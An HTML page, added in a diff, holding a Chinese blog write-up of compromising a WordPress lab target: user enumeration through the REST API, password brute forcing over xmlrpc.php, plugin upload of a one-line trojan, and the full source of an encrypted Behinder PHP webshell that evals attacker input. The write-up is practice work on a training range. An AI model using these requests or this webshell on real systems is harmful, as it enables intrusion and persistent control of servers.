@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WordPress - “花咲雨町”之前打线下有个渗透就是WordPress某个主题的一个漏洞，这次来学习一下这个的 我是完全对着sibei师傅的来的，靶场来自极核-getshell，很好的一个网站有很多资源 1https:&#x2F;&#x2F;get-shell.com&#x2F;  首先是WordPress的一个程序的漏洞，先想办法获取登录信息，在WordPress上有一个REST API，以获取到当前WordPress">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WordPress - &quot;花咲雨町&quot;漏洞复现">
+<meta property="og:url" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/index.html">
+<meta property="og:site_name" content="CrispSheep">
+<meta property="og:description" content="WordPress - “花咲雨町”之前打线下有个渗透就是WordPress某个主题的一个漏洞，这次来学习一下这个的 我是完全对着sibei师傅的来的，靶场来自极核-getshell，很好的一个网站有很多资源 1https:&#x2F;&#x2F;get-shell.com&#x2F;  首先是WordPress的一个程序的漏洞，先想办法获取登录信息，在WordPress上有一个REST API，以获取到当前WordPress">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119204843326.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119205459899.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119210644098.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119213908151.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214232138.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214345279.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214558096.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220319215.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220400884.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220558502.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250120093635723.png">
+<meta property="og:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250120094056789.png">
+<meta property="article:published_time" content="2025-01-20T01:42:15.000Z">
+<meta property="article:modified_time" content="2025-01-20T01:42:37.953Z">
+<meta property="article:author" content="CrispSheep">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119204843326.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>WordPress - &#34;花咲雨町&#34;漏洞复现</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- 字体样式 -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Noto+Sans+SC:normal,bold,italic">
+	<link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Fira+Code:normal,bold">
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&text=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&is_video=false&description=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WordPress - &#34;花咲雨町&#34;漏洞复现&body=Check out this article: http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&name=WordPress - &#34;花咲雨町&#34;漏洞复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&t=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WordPress-%E2%80%9C%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA%E2%80%9D"><span class="toc-number">1.</span> <span class="toc-text">WordPress - “花咲雨町”</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        WordPress - &#34;花咲雨町&#34;漏洞复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">CrispSheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-20T01:42:15.000Z" class="dt-published" itemprop="datePublished">2025-01-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="WordPress-“花咲雨町”"><a href="#WordPress-“花咲雨町”" class="headerlink" title="WordPress - “花咲雨町”"></a>WordPress - “花咲雨町”</h1><p>之前打线下有个渗透就是WordPress某个主题的一个漏洞，这次来学习一下这个的</p>
+<p>我是完全对着sibei师傅的来的，靶场来自极核-getshell，很好的一个网站有很多资源</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">https</span>://<span class="built_in">get</span>-<span class="built_in">shell</span>.com/</span><br></pre></td></tr></table></figure>
+
+<p>首先是WordPress的一个程序的漏洞，先想办法获取登录信息，在WordPress上有一个REST API，以获取到当前WordPress的真实用户名</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.hackhub.<span class="built_in">get</span>-<span class="keyword">shell</span>.<span class="keyword">com</span>:<span class="number">64738</span>/<span class="keyword">wp</span>-json/<span class="keyword">wp</span>/v2/users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119204843326.png" alt="image-20250119204843326"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u7cf8\u5317&quot;</span><span class="punctuation">,</span><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u6253\u7834\u4e00\u5207.&quot;</span><span class="punctuation">,</span><span class="attr">&quot;link&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/192.168.74.11\/author\/2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;slug&quot;</span><span class="punctuation">:</span><span class="string">&quot;webadmin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;avatar_urls&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;24&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/secure.gravatar.com\/avatar\/7932a5605eef1797bf6cbba8d576526e?s=24&amp;d=mm&amp;r=g&quot;</span><span class="punctuation">,</span><span class="attr">&quot;48&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/secure.gravatar.com\/avatar\/7932a5605eef1797bf6cbba8d576526e?s=48&amp;d=mm&amp;r=g&quot;</span><span class="punctuation">,</span><span class="attr">&quot;96&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/secure.gravatar.com\/avatar\/7932a5605eef1797bf6cbba8d576526e?s=96&amp;d=mm&amp;r=g&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/192.168.74.11\/wp-json\/wp\/v2\/users\/2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;targetHints&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;allow&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;GET&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;collection&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/192.168.74.11\/wp-json\/wp\/v2\/users&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>得到一串这个slug的值就是当前web站点的真实登录的用户名也就是webadmin</p>
+<p>有了用户名下面我们接着找爆破的地方</p>
+<p>WordPress 的 xmlrpc.php 文件是一个用于处理外部请求的接口，允许通过 XML-RPC 协议与 WordPress 网站进行通信，允许外部应用程序与 WordPress 进行交互，如发布文章、管理评论、获取统计数据、登录请求等。</p>
+<p>Tips：在默认情况下，一些主题会禁用 xmlrpc.php这个功能文件（不用这个东西的话可以直接删除这个文件以提升安全性，不影响WordPress的使用），包括本靶机默认情况下也是禁用的，但是为了流程就开起来了。不过在很多的WordPress站点上，这个功能并没有关闭，依然可以利用。</p>
+<p>我们尝试访问一下试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xmlrpc.php</span><br></pre></td></tr></table></figure>
+
+<p>只允许POST请求</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119205459899.png" alt="image-20250119205459899"></p>
+<p>查询当前可以用的方法</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /xmlrpc.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: node.hackhub.get-shell.com:<span class="number">64738</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">131.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span> Edg/<span class="number">131.0.0.0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh,zh-CN;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=mu311op1a8stoiprqrp1td1geh; showed_system_notice=showed; fps_accelerat=<span class="number">116</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;methodCall&gt;</span></span><br><span class="line">  <span class="section">&lt;methodName&gt;</span><span class="attribute">system</span>.listMethods&lt;/methodName&gt;</span><br><span class="line">  <span class="section">&lt;params&gt;</span><span class="section">&lt;/params&gt;</span></span><br><span class="line"><span class="section">&lt;/methodCall&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到响应有很多方法可以用</p>
+<p><strong><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119210644098.png" alt="image-20250119210644098"></strong></p>
+<p>这里我们用</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wp</span>.getUserBlogs</span><br></pre></td></tr></table></figure>
+
+<p>数据包如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xmlrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node.hackhub.get-shell.com:64738</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>170</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>password<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119213908151.png" alt="image-20250119213908151"></p>
+<p>可以看到响应，已知用户名是webadmin，开始爆破</p>
+<p>可以看见这里已经提示我们成功了</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214232138.png" alt="image-20250119214232138"></p>
+<p>用户名:webadmin</p>
+<p>密码:admin123</p>
+<p>成功登录</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214345279.png" alt="image-20250119214345279"></p>
+<p>下面上传后门</p>
+<p>一般来说，进入后WordPress后台只需要使用 <strong>插件 -&gt; 插件文件编辑器</strong> 或者 <strong>外观 -&gt; 主题文件编辑器</strong> ，就可以直接编辑主题 &#x2F; 插件的PHP代码，从而实现插入后门。</p>
+<p>来这里随便下个插件</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>//cn.wordpress<span class="meta">.org</span>/plugins/</span><br></pre></td></tr></table></figure>
+
+<p>准备一个一句话木马，塞到下载的插件文件里</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119214558096.png" alt="image-20250119214558096"></p>
+<p>点击后台管理，插件，安装新插件，上传插件，立即安装</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220319215.png" alt="image-20250119220319215"></p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220400884.png" alt="image-20250119220400884"></p>
+<p>一般来说，WordPress的插件目录在 &#x2F;wp-content&#x2F;plugins&#x2F;</p>
+<p>我这个在<strong>print-my-blog&#x2F;shell.php</strong>这个目录下，启用试试能不能获得shell</p>
+<p>完整目录</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.hackhub.<span class="built_in">get</span>-<span class="keyword">shell</span>.<span class="keyword">com</span>:<span class="number">52581</span>/<span class="keyword">wp</span>-content/plugins/<span class="keyword">print</span>-my-blog/<span class="keyword">shell</span>.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250119220558502.png" alt="image-20250119220558502"></p>
+<p>尝试了一下一些命令都无法执行，cmd&#x3D;phpinfo();可以执行看到了很多函数都被禁用了</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250120093635723.png" alt="image-20250120093635723"></p>
+<p>掏出我上次的冰蝎webshell试试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;dfff0a7fa1a55c8c&quot;</span>; </span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把之前的插件删掉，从新准备webshell再次上传试试</p>
+<p>成功连接</p>
+<p><img src="/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/image-20250120094056789.png" alt="image-20250120094056789"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WordPress-%E2%80%9C%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA%E2%80%9D"><span class="toc-number">1.</span> <span class="toc-text">WordPress - “花咲雨町”</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&text=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://crispsheep.icu/2025/01/20/WordPress%E8%8A%B1%E5%92%B2%E9%9B%A8%E7%94%BA/&title=WordPress - &#34;花咲雨町&#34;漏洞复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
